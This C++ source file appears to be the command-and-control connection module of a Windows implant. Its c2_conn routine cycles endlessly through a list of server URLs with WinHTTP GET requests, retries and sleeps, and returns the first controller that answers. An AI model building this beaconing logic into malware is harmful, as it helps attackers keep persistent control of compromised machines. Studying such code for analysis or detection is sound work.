#include "c2_conn.h"


std::wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}


std::string c2_conn(const std::vector<std::string>& urls) {
    int timeout = 10 * 1000; // 10 seconds
    int retry = 3;
    int interval = 1; // 1 minute
    std::string connectedWebsite;

    while (true) {
        for (const std::string& website : urls) {
            bool isConnected = false;
            for (int i = 0; i < retry; i++) {
                BOOL bResults = FALSE;
                DWORD dwSize = 0;
                DWORD dwDownloaded = 0;
                DWORD dwFlags = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
                HINTERNET  hSession = NULL,
                    hConnect = NULL,
                    hRequest = NULL;

                // Use WinHttpOpen to obtain a session handle.
                hSession = WinHttpOpen(L"WinHTTP Example/1.0",
                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                    WINHTTP_NO_PROXY_NAME,
                    WINHTTP_NO_PROXY_BYPASS, 0);

                // Specify an HTTP server.
                if (hSession)
                    hConnect = WinHttpConnect(hSession, s2ws(website).c_str(), INTERNET_DEFAULT_HTTP_PORT, 0);

                // Create an HTTP request handle.
                if (hConnect)
                    hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL,
                        NULL, WINHTTP_NO_REFERER,
                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                        0);

                // Send a request.
                if (hRequest)
                    bResults = WinHttpSendRequest(hRequest,
                        WINHTTP_NO_ADDITIONAL_HEADERS,
                        0, WINHTTP_NO_REQUEST_DATA, 0,
                        0, 0);

                // End the request.
                if (bResults)
                    bResults = WinHttpReceiveResponse(hRequest, NULL);

                // Check if connection is successful
                if (bResults) {
                    isConnected = true;
                }

                // Close all handles.
                if (hRequest) WinHttpCloseHandle(hRequest);
                if (hConnect) WinHttpCloseHandle(hConnect);
                if (hSession) WinHttpCloseHandle(hSession);

                if (isConnected) {
                    connectedWebsite = website;
                    break;
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(timeout));
            }

            if (!connectedWebsite.empty()) {
                return connectedWebsite;
            }
        }

        std::this_thread::sleep_for(std::chrono::minutes(interval));
    }

    return "";
}
